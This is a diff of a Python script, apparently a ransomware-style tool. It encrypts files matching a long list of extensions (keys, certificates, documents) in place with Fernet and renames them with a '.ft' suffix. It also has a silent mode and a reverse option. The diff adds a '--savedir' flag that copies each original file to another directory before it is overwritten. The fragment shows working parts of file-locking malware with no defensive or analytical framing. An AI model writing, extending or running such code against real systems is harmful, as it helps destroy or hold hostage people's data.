@@ -2,6 +2,7 @@ from cryptography.fernet import Fernet
 import sys
 import argparse
 import os
+import shutil
 
 extensions = [
 	'.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
@@ -32,7 +33,7 @@ parser.add_argument('-r', '--reverse', type=str)
 parser.add_argument('-k', '--genkey')
 parser.add_argument('-s', '--silent', action='store_true')
 parser.add_argument('-v', '--version', action='store_true')
-
+parser.add_argument('-d', '--savedir', type=str)
 args = parser.parse_args()	
 
 def genkey():
@@ -47,6 +48,8 @@ def encript_file(filename):
 		with open(filename, 'rb') as text:
 			or_data = text.read()
 		enc_data = cyphr.encrypt(or_data)
+		if args.savedir:
+			shutil.copy(filename, args.savedir)
 		with open(filename, 'wb') as enc_file:
 			enc_file.write(enc_data)
 		os.rename(filename, filename + '.ft')
